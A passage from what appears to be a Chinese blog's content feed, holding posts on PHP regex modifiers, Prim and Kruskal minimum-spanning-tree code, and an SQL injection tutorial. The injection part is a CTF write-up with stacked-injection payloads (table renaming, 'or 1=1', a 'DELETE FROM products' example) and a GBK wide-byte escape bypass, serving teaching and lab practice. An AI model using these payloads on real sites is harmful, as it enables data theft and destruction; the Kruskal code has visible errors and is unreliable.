+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/h[^aeiou]p/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;hcphaphbp&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/04/nMb7CQAXNafgP18.png" alt="image-20201104231153881"></p>
+<h3 id="-7"><a href="#-7" class="headerlink" title="()"></a><code>()</code></h3><p>表示将括号中的内容当作是一个整体来进行匹配，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/h(a|b)p/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;haphbphcp&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/04/2aNAGYRv3j4gMoc.png" alt="image-20201104232844750"></p>
+<p>注意数组$arr将会储存符合整个正则表达式的字符串和符合括号中的正则表达式的字符串，并且分别储存在两个数组之中。</p>
+<h3 id="动态匹配"><a href="#动态匹配" class="headerlink" title="()动态匹配"></a><code>()</code>动态匹配</h3><p>在<code>()</code>之后使用 <code>//数字x</code> 表示匹配第x个括号匹配的内容，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/h(a|b)(c|d)p\\1\\2/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;hacpac hacpbd&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中当第一个括号匹配为a，第二个括号匹配为c的时候<code>\\\\1</code>就是<code>a</code>而不是<code>(a|b)</code>  <code>\\\\2</code>就是<code>c</code>而不是<code>(c|d)</code></p>
+<p>输出结果：<img src="https://i.loli.net/2020/11/04/UVLWDNlyaimHf7I.png" alt="image-20201104235433817"></p>
+<h2 id="模式修正符"><a href="#模式修正符" class="headerlink" title="模式修正符"></a>模式修正符</h2><p><em>在正则表达式的定界符之后使用，可以调整正则表达式的解释，扩展正则表达式在匹配、替换等操作时的某些功能，增强正则表达式的处理能力。</em></p>
+<h3 id="模式修正符：i"><a href="#模式修正符：i" class="headerlink" title="模式修正符：i"></a>模式修正符：<code>i</code></h3><p>在和模式进行匹配时不区分大小写，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/abc/i&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;abcABCaBC&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/06/PcZkz1fsSre5Iq9.png" alt="image-20201106145915200"></p>
+<h3 id="模式修正符：m"><a href="#模式修正符：m" class="headerlink" title="模式修正符：m"></a>模式修正符：<code>m</code></h3><p>将进行多行匹配，既将含有换行符的字符串的每一行视为一个新的一行，其每一行都能有开头和结尾，如果目标字符串中没有 \n 字符，或者模式中没有出现 ^ 或 $，这个修正符不会产生任何影响</p>
+<p>如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/^test/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;test\ntest\ntest&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其输出结果为：<img src="https://i.loli.net/2020/11/06/oC6uWJlw72tN1LX.png" alt="image-20201106152303309"></p>
+<p>其中str中有3个 test 但是由于默认进行单行匹配，所以只有第一行的test被当作为开头，所以只匹配了一个，如果加上多行匹配模式修正符 m，即：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/^test/m&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;test\ntest\ntest&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到的结果为：<img src="https://i.loli.net/2020/11/06/oFVvjUJAzSdHIuY.png"></p>
+<p>在加上多行匹配模式修正符m之后，将会把每一行的开头和结尾都当做是开头和结尾，所以成功匹配了3个 test</p>
+<h3 id="不同系统下的换行"><a href="#不同系统下的换行" class="headerlink" title="不同系统下的换行"></a>不同系统下的换行</h3><p>接上题，如果将代码改成下面这样：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/test$/m&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;test</span></span><br><span class="line"><span class="string">test</span></span><br><span class="line"><span class="string">test&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出的结果为：<img src="https://i.loli.net/2020/11/06/Tm9yNZGaiP6bS23.png" alt="image-20201106153409140"></p>
+<p>在多行匹配模式修正符m的多用下，理应匹配每一行中以test结尾的字符串，但是这里只匹配了一个，原因是什么？</p>
+<p>原因是在windows系统中，你所看到的换行不单纯是 ‘\n’ ，而是回车符 ‘\r’ 与换行符 ‘\n’ 的组合，所以在以上的字符串$str其实是：’’test\r\ntest\r\ntest” </p>
+<p>其中每一行的结尾为\r，所以多行匹配只能匹配到最后一行的test，如果改为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/test\r*$/m&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;test</span></span><br><span class="line"><span class="string">test</span></span><br><span class="line"><span class="string">test&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>就可以将其全部匹配：<img src="https://i.loli.net/2020/11/06/Aa9CM4yZL7scORp.png" alt="image-20201106154339698"></p>
+<p>而在linux系统中，你所看到的换行就是单纯的 ‘\n’</p>
+<h3 id="模式修正符：s"><a href="#模式修正符：s" class="headerlink" title="模式修正符：s"></a>模式修正符：<code>s</code></h3><p>如果设定了该修正符，那么将匹配所有的包括换行符的字符，如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/t.st/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;t\nst&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其输出结果为：<img src="https://i.loli.net/2020/11/06/KFzXLeUR9mrPqWQ.png" alt="image-20201106154831017"></p>
+<p>由于<a href="#.">点号.</a> 只能匹配除了换行符之外的所有字符，所以该匹配结果为空，所以加上模式修正符s：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/t.st/s&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;t\nst&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/06/uNanjgCY8kmbzMy.png" alt="image-20201106161155162"></p>
+<p>这样就可以匹配带有换行符 \n 的字符串</p>
+<h3 id="模式修正符：U"><a href="#模式修正符：U" class="headerlink" title="模式修正符：U"></a>模式修正符：<code>U</code></h3><p>该模式修正符可以禁止进行<a href="#%E8%B4%AA%E5%A9%AA%E5%8C%B9%E9%85%8D">贪婪匹配</a></p>
+<p>即：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/a.*b/U&#x27;</span>; <span class="comment">//等效于 $pattern=&#x27;/a.*?b/&#x27;;</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;a123ba123ba123b&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>模式修正符可以多个搭配使用</strong></p>
+<p>如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/a.*b/Uis&#x27;</span>; </span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;a\nBA123ba123b&quot;</span>;</span><br><span class="line">var_dump(preg_match_all(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>));</span><br><span class="line">var_dump(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<img src="https://i.loli.net/2020/11/06/vSrKNHDyREGjmwc.png" alt="image-20201106163955651"></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+        <tag>正则表达式</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Prim算法与Kruskal算法</title>
+    <url>/2021/05/03/Prim%E7%AE%97%E6%B3%95%E4%B8%8EKruskal%E7%AE%97%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="Prim算法"><a href="#Prim算法" class="headerlink" title="Prim算法"></a>Prim算法</h2><p>普里姆（Prim）算法是一种构造性算法，用于构造最小生成树，其基本思路为：</p>
+<p>（1）选择一个顶点<code>v</code>初始化<code>U</code>=<code>&#123;v&#125;</code>，<code>v</code>到其他顶点的所有边都为侯选边（侯选边实际上便是<code>V</code>中顶点到<code>U</code>中的顶点的最短边）</p>
+<p>（2）重复以下步骤n-1次，使得其他n-1个顶点被加入到U中：</p>
+<p>①从侯选边中挑选权值最小的边输出，设该边在<code>V</code>-<code>U</code>中的顶点是<code>k</code>，将<code>k</code>加入<code>U</code>中</p>
+<p>②考察当前<code>V</code>-<code>U</code>中的所有顶点<code>j</code>，修改侯选边，如果<code>(k,j)</code>的权值小于原来和顶点<code>j</code>关联的侯选边，则用<code>(k,j)</code>取代后者作为侯选边（如下图所示）</p>
+<p><img src="https://i.loli.net/2021/05/02/1uogsb3edOZ8mri.png" alt="image-20210502234110462"></p>
+<p>在算法设计的过程中，我们需要解决以下四个问题：</p>
+<p><strong>（1）如何求<code>U</code>、<code>V</code>两个顶点集之间的最小边？</strong></p>
+<p>只需要考虑<code>V</code>-<code>U</code>顶点<code>j</code>到<code>U</code>顶点集的最小边（无向图），比较从而找出最小边之中的最小边</p>
+<p><strong>（2）如何存储顶点<code>j</code>到顶点集<code>U</code>的最小边？</strong></p>
+<p>我们可以引入两个数组：<code>closest[]</code>与<code>lowcost[]</code></p>
+<p>其中<code>closest[j]</code>表示的是顶点<code>j</code>到顶点集<code>U</code>的最小边的终点（是一个在<code>U</code>中的顶点）</p>
+<p><code>lowcost[j]</code>表示<code>j</code>到顶点集<code>U</code>的最小边的长度（对于已经进入<code>U</code>的顶点<code>k</code>有<code>lowcost</code>=0）</p>
+<p><img src="https://i.loli.net/2021/05/02/eMrVHm3kadG6qCn.png" alt="image-20210502235427592"></p>
+<p><strong>（3）判断一个顶点属于哪个集合？</strong></p>
+<p>对于已经进入已经进入<code>U</code>的顶点<code>k</code>有<code>lowcost</code>=0，从而判断一个顶点是否已经进入<code>U</code></p>
+<p><strong>（4）图采用哪种存储结构会更合适？</strong></p>
+<p>采用邻接矩阵会更合适</p>
+<p><strong>代码实现如下：</strong></p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 32767</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Prim</span><span class="params">(MatGraph g,<span class="keyword">int</span> v)</span></span>&#123; <span class="comment">//使用普里姆算法产生最小生成树</span></span><br><span class="line">    <span class="keyword">int</span> lowcost[MAXV],closest[MAXV];</span><br><span class="line">    <span class="keyword">int</span> min,i,j,k;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g.n;i++)&#123; <span class="comment">//给lowcost[]和closest[]置初值</span></span><br><span class="line">        lowcost[i]=g.edges[v][i]; <span class="comment">//初始V-U中每个顶点到U的距离为到v的距离</span></span><br><span class="line">        closest[i]=v; <span class="comment">//一开始都是连到v，因为U中只有一个v</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;g.n;i++)&#123;</span><br><span class="line">		min=INF;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;g.n;j++)</span><br><span class="line">            <span class="keyword">if</span>(lowcost[j]!=<span class="number">0</span> &amp;&amp; lowcost[j]&lt;min)&#123;<span class="comment">//不在U中并且比当前的最小值小</span></span><br><span class="line">                min=lowcost[j];</span><br><span class="line">                k=j;<span class="comment">// 设置为最小值</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">/*以上是已经找到了侯选边*/</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;边(%d,%d)，权为%d\n&quot;</span>,closest[k],k,min);</span><br><span class="line">        lowcost[k]=<span class="number">0</span>; <span class="comment">//标记k已经加入U</span></span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;g.n;j++)</span><br><span class="line">             <span class="keyword">if</span>(lowcost[j]!=<span class="number">0</span> &amp;&amp; g.edges[k][j]&lt;lowcost[j])&#123; <span class="comment">//不在U中并且刚刚加入k后的最小边发生了改变</span></span><br><span class="line">                 lowcost[j]=g.edges[k][j]; <span class="comment">//修改最小边长</span></span><br><span class="line">                 closest[j]=k; <span class="comment">//修改最小边</span></span><br><span class="line">             &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Kruskal算法"><a href="#Kruskal算法" class="headerlink" title="Kruskal算法"></a>Kruskal算法</h2><p>克鲁斯卡尔（Kruskal）算法也是一种求带权无向图的最小生成树的构造性算法，<strong>它是一种按权值的递增次序选择合适的边来构造最小生成树的方法</strong>，其基本思路为：</p>
+<p>（1）置<code>U</code>（最终结果）的初值等于<code>V</code>（即包含有<code>G</code>中的全部顶点），又设置一个边集<code>TE</code>用来表示最小生成树的边集，其初值为空集（即图中每一个顶点都构成一个连通分量）</p>
+<p>（2）将图<code>G</code>中的边按照权值从小到大的顺序进行依次选取：</p>
+<p>①如果选取该边位使生成树产生贿赂，则将其加入<code>TE</code></p>
+<p>②否则舍弃，直到<code>TE</code>中包含n-1条边为止</p>
+<p>在算法设计的过程中，需要解决以下三个问题：</p>
+<p><strong>（1）图采用哪种存储结构更合适？</strong></p>
+<p>采用邻接矩阵会更合适</p>
+<p><strong>（2）边的排序问题</strong></p>
+<p>采用直接插入排序算法</p>
+<p><strong>（3）如何解决加入一条边后是否出现回路</strong></p>
+<p>使用连通分量编号，建立一个数组，其中对每个顶点有一个编号（初始互不相连的时候的编号为顶点本身的序号），编号相同代表两个顶点之间有路径，否则表示两个顶点之间没路径，当将两个顶点相连时，设置两个顶点编号相同。如果两个顶点相连之前编号就已经相同，说明加入连接这两个顶点的边之后会出现回路</p>
+<p><strong>代码实现如下：</strong></p>
+<p>首先用结构体数组<code>E</code>来存放图<code>G</code>中的所有边：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span>    <span class="keyword">int</span> u;<span class="comment">//边的起始顶点</span></span><br><span class="line">     <span class="keyword">int</span> v;<span class="comment">//边的终止顶点</span></span><br><span class="line">     <span class="keyword">int</span> w;<span class="comment">//边的权值</span></span><br><span class="line">&#125;Edge; </span><br></pre></td></tr></table></figure>
+
+<p>克鲁斯卡尔（Kruskal）算法如下：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Kruskal</span><span class="params">(MatGraph g)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> vset[MAXV]; <span class="comment">//用来存放定点编号</span></span><br><span class="line">    Edge E[MsxSize]; <span class="comment">//用来存放所有边</span></span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>; <span class="comment">//用来表示边的数量</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;g.n;j++)</span><br><span class="line">            <span class="keyword">if</span>(g.edges[i][j]!=<span class="number">0</span> &amp;&amp; g.defes[i][j]!=INF)&#123; <span class="comment">//如果存在一条边</span></span><br><span class="line">                E[k].u=i;E[k].v=j;E[k].w=g.edges[i][j]; <span class="comment">//将其加入结构体数组E</span></span><br><span class="line">                k++;</span><br><span class="line">            &#125;</span><br><span class="line">    InsertSort[E,g.e]; <span class="comment">//对E数组按照权值递增进行排序</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        vset[i]=i; <span class="comment">//初始化编号数组</span></span><br><span class="line">    <span class="keyword">int</span> now=<span class="number">1</span>; <span class="comment">//now此时用来表示当前构造生成树的第几条边，初值为1</span></span><br><span class="line">    <span class="keyword">int</span> i_edge=<span class="number">0</span>; <span class="comment">//i_edge是E中边的下标</span></span><br><span class="line">    <span class="keyword">while</span>(now&lt;g.n)&#123; <span class="comment">//生成的边数小于n的时候循环</span></span><br><span class="line">        <span class="keyword">int</span> start=E[now].u;</span><br><span class="line">        <span class="keyword">int</span> end=E[now].v; <span class="comment">//取得某条边的头尾顶点</span></span><br><span class="line">        <span class="keyword">if</span>(vset[start]!=vset[end])&#123; <span class="comment">//两个顶点所属不同的集合</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;边(%d,%d)，权为%d\n&quot;</span>,start,end,E[now].w); </span><br><span class="line">            k++;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;g.n;i++) <span class="comment">//两个顶点连接之后将其编号进行统一</span></span><br><span class="line">                <span class="keyword">if</span>(vset[i]==vset[end]) <span class="comment">//将终点及与之同编号的结点全部改为起点</span></span><br><span class="line">                    vset[i]=vset[end];</span><br><span class="line">        &#125;</span><br><span class="line">        now++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上的算法并不是最优，当使用堆排序以及并查集进行改进之后算法的时间复杂度可以降到<strong>O(elog2e)</strong></p>
+<p><strong>Prim算法更适合稠密图求最小生成树</strong></p>
+<p><strong>Kruskal算法更适合稀疏图求最小生成树</strong></p>
+<p>因为Kruskal算法是通过遍历边，排序之后，对边来进行贪心算法，在求边相对于顶点较少的稀疏图的过程中会占用更小的复杂度</p>
+<p>Prim算法则是通过添加顶点的方式来生成最小生成树，在求顶点相对于边较少的稠密图的过程中会占用更小的复杂度</p>
+]]></content>
+      <categories>
+        <category>算法</category>
+        <category>bug储藏室</category>
+      </categories>
+      <tags>
+        <tag>数据结构</tag>
+        <tag>算法</tag>
+        <tag>图</tag>
+        <tag>树</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入【进阶】</title>
+    <url>/2021/04/29/SQL%E6%B3%A8%E5%85%A5%E3%80%90%E8%BF%9B%E9%98%B6%E3%80%91/</url>
+    <content><![CDATA[<h2 id="6、堆叠注入"><a href="#6、堆叠注入" class="headerlink" title="6、堆叠注入"></a>6、堆叠注入</h2><h3 id="mysqli-multi-query-函数与mysqli-query-函数"><a href="#mysqli-multi-query-函数与mysqli-query-函数" class="headerlink" title="mysqli_multi_query() 函数与mysqli_query() 函数"></a>mysqli_multi_query() 函数与mysqli_query() 函数</h3><p><code>mysqli_multi_query() </code>函数：在php代码中执行多个针对数据库的查询</p>
+<p><code>mysqli_query()</code> 函数：在php代码中执行针对数据库的查询</p>
+<p>一般后端php代码中，进行数据库查询的语句都使用的<code>mysqli_query() </code>函数，但是如果使用了<code>mysqli_multi_query() </code>函数，就可以在查询语句之后，执行其他的sql语句，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁，以下是<strong>buuctf</strong>中一个堆叠注入的例子：</p>
+<h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>在url中我们可以很容易就找到注入点inject：</p>
+<p>于是对注入点进行测试，首先试着进行联合注入：</p>
+<p>构造闭合之后输入payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select database()#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/02/26/bB3ckU4rAQ8pMPn.png" alt="image-20210122220214500"></p>
+<p>返回结果如上，不难发现select、update等关键语句都被过滤掉，但是show、table、column等并未被过滤，于是可以试着使用堆叠注入：</p>
+<p>构造闭合之后输入payload（首先查库名）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;show databases;#</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/02/26/1mZUCXJ8QWhliwG.png" alt="image-20210122221127417" style="zoom:67%;" />
+
+<p>如上图所示，可以成功查询出数据库中的所有库名，接下来查询表名：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;show tables;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/02/26/Ncq1Pf46mO8QTW9.png" alt="image-20210122221836268"></p>
+<p>接下来试着查询两个表中的列名：</p>
+<p>对于1919810931114514表：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>
+
+<p>（注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符，当表名为纯数字时，需要用反单引号将表名括起来），得到结果：</p>
+<p><img src="https://i.loli.net/2021/01/22/JcxG6KLEb2wteQq.png" alt="image-20210122223058514"></p>
+<p>发现flag在这个表中，我们接着查询words表中的列名：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;show columns from words;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/22/7cXEIrfYgOD8wtl.png" alt="image-20210122223310965"></p>
+<p>发现words表只有两列，此时可以进行猜测，查询语句便是在这个表中查询数据的，所以我们此时便可以进行猜测，主查询语句为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select id, data from words where id &#x3D; &#39;xx&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>我们既然不能在主查询语句后面做手脚，但是可以纯粹用主查询语句进行flag的查询，即，将表1919810931114514改名成words，然后将words改成别的名字，又把列名flag改为id，狸猫换太子，然后主查询语句表面上是查询words表中的id与data，实际上查到了1919810931114514表中的flag：</p>
+<p>使用堆叠注入进行表名和列名的修改：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;rename table words to words1;rename table &#96;1919810931114514&#96; to words;alter table words change flag data varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#</span><br></pre></td></tr></table></figure>
+
+<p>这时候我们再查询表名与列名发现已经修改完毕，再回到主查询语句之中用万能钥匙进行遍历：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/22/yi8OK6jeqmElTzt.png" alt="image-20210122224913789"></p>
+<p>补充：查询列名和表名除了使用show语句，还可以使用desc语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">desc &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>
+
+<p><strong>以上使用了堆叠注入，其原理为：</strong></p>
+<p><strong>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在分号（;）结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。</strong><br> <strong>用户输入：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1; DELETE FROM products</span><br></pre></td></tr></table></figure>
+
+
+<p> <strong>服务器端生成的sql语句为：（因未对输入的参数进行过滤）</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select * from products where productid&#x3D;1;DELETE FROM products</span><br></pre></td></tr></table></figure>
+
+
+<p> <strong>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</strong></p>
+<h2 id="7、宽字节注入"><a href="#7、宽字节注入" class="headerlink" title="7、宽字节注入"></a>7、宽字节注入</h2><h3 id="mysql中一些用于转义的函数"><a href="#mysql中一些用于转义的函数" class="headerlink" title="mysql中一些用于转义的函数"></a>mysql中一些用于转义的函数</h3><p>在mysql中，有一些函数，比如<code>addslashes</code>，<code>mysql_real_escape_string</code>，<code>mysql_escape_string</code>等，会将字符串中的标志性字符，比如单引号<code>&#39;</code>，双引号<code>&quot;</code>等进行转义，即在其前面加上一个反斜杠<code>\</code>来让其含义变为纯粹的字符，如果后端使用这些函数进行了一个过滤，我们在sql注入语句中的引号等字符便无法发挥其应发挥的作用，如何绕过这样的过滤？可以采用宽字节注入的方式</p>
+<h3 id="有关宽字节"><a href="#有关宽字节" class="headerlink" title="有关宽字节"></a>有关宽字节</h3><p><strong>字符、字符集</strong><br>字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。</p>
+<p><strong>UTF8</strong><br>由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。</p>
+<p><strong>宽字节</strong><br>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p>
+<p>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集，以下是一个利用该漏洞绕过转义函数的例子：</p>
+<p>当字符串<code>%df&#39;</code>被转义函数进行转义时，会变为<code>%df\&#39;</code>，其十六进制格式为：<code>%df%5c%27</code>此时，如果程序默认使用的是GBK字符集，比如MySQL，就将会把前面两个十六进制数当作是一个宽字节编码，即汉字<code>縗</code>，所以这时候在后台便是<code>縗&#39;</code>，此时单引号未被转义，成功绕过了该过滤</p>
+<h3 id="宽字节注入的实例"><a href="#宽字节注入的实例" class="headerlink" title="宽字节注入的实例"></a>宽字节注入的实例</h3><p>在pikachu靶场中的宽字节注入模块，我们发现用万能钥匙无法将数据库中的内容爆出来，我们此时考虑使用宽字节注入，抓包之后，在name处提交payload：</p>
